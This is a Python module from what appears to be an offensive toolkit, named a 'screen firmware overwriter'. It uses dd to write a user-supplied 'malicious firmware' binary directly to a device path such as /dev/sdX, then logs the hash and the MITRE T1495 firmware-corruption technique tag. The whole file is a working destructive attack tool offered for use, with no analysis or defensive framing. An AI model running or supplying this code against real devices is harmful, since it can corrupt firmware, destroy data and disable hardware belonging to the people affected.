# modules/attacks/screen_firmware_overwriter.py

import os
import argparse
import subprocess
from datetime import datetime
import json
from hashlib import sha256

LOG_PATH = "results/firmware_attack_logs.json"
MITRE_TTP = "T1495"

def log_overwrite(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def overwrite_firmware(device_path, malicious_fw):
    if not os.path.exists(device_path):
        raise FileNotFoundError(f"Target device path not found: {device_path}")
    if not os.path.exists(malicious_fw):
        raise FileNotFoundError(f"Malicious firmware file missing: {malicious_fw}")

    try:
        subprocess.run(["dd", f"if={malicious_fw}", f"of={device_path}", "bs=1M", "conv=fsync"], check=True)
        print(f"[✓] Firmware overwritten on {device_path}")
    except subprocess.CalledProcessError as e:
        print(f"[!] Firmware overwrite failed: {e}")
        return False
    return True

def execute(device_path, fw_image):
    print("[+] Starting screen firmware overwrite...")
    fw_hash = sha256(open(fw_image, "rb").read()).hexdigest()

    success = overwrite_firmware(device_path, fw_image)

    log_overwrite({
        "timestamp": datetime.utcnow().isoformat(),
        "device_path": device_path,
        "firmware_used": fw_image,
        "sha256": fw_hash,
        "success": success,
        "ttp": MITRE_TTP
    })

    if success:
        print(f"[✓] Operation complete. SHA256: {fw_hash}")
    else:
        print("[!] Operation failed. Device state unknown.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Smart Screen Firmware Overwriter")
    parser.add_argument("--device", required=True, help="Path to screen device mount (e.g., /dev/sdX)")
    parser.add_argument("--firmware", required=True, help="Malicious firmware binary to write")
    args = parser.parse_args()

    execute(args.device, args.firmware)
